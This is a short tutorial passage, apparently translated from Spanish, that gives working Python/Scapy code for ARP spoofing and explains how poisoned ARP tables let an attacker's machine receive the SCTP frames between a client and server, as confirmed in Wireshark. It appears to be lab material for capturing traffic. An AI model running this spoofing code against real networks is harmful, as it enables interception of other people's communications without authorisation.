# Doing an spoofer

Using some very simple functions and Scapy, it is possible to make a
Corruption of ARP tables on both client and server:

    # Función para obtener la MAC
    def get_mac(ip): 
        arp_request = scapy.ARP(pdst = ip) 
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
        arp_request_broadcast = broadcast / arp_request 
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
        return answered_list[0][1].hwsrc

    # Función para realizar ARP Spoofing
    def arp_spoof_basic(target_ip, spoof_ip):

        # Get the MAC address of the target IP
        target_mac = scapy.getmacbyip(target_ip)
        # Create the ARP packet
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # Send the ARP packet
        scapy.send(packet, verbose=False)
        # Return the MAC address of the target IP
        return target_mac

The direct consequence of spoofing is that in this way we can
receive on our team all the frames exchanged by the client and
server:

![](../images/47-1.png)

In wireshark it is observed that for each SCTP generated by the client there is a
identical one that is forwarded with the attacker's MAC. The same happens with the
SCTP sent from the server.

The direct consequence is that we do not need to capture at each end,
poisoning the ARP tables the system acts as a mirror port, without
affect the behavior of client-server communication
